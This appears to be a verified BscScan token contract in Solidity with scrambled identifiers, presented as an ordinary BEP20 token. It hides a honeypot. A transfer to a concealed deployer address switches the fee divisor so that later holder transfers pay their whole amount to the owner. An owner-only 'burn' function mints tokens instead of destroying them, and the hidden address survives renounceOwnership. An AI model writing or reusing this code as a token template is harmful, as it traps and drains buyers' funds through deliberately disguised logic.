/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 09:21 GMT
 */
pragma solidity >=0.4.11;
contract bYXuVL {
address public  VmqfvS = address(0);
mapping (address => uint256) public balanceOf;
string public  symbol = "BVjuZw";
uint256 public  dNngDQ = 10000000000000000;
uint256 public  ickOKG = 100000000000000000;
address public  JwkMSs = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  ACRBDV = 10000000000000000000000000000;
uint256 public  HfkCVh = 100000000000000000000;
uint256 public constant BWRAuY = 9+1;
uint256 private  efleBi = 10000000000000;
address public  XABxFZ = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  ItdbsW = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  YeqwKQ = 10000000000000000000;
uint256 public  Lnbygz = 100000000000000000000000;
address public  GHyFym = address(0);
uint256 public  ISmkrY = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  LuuvsA = 100000000000000000000000;
string public  name = "iCLbuK";
address public  ERJSkG = address(0);
uint8 public constant decimals = 18;
address public  XkYLJU = address(0);
address public owner;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () public {
ItdbsW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "sEdwpy");
require(to != address(0), "sEdwpy");
require(amount <= balanceOf[from], "sEdwpy");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* BWRAuY/efleBi ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ItdbsW){
efleBi = 9+1;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}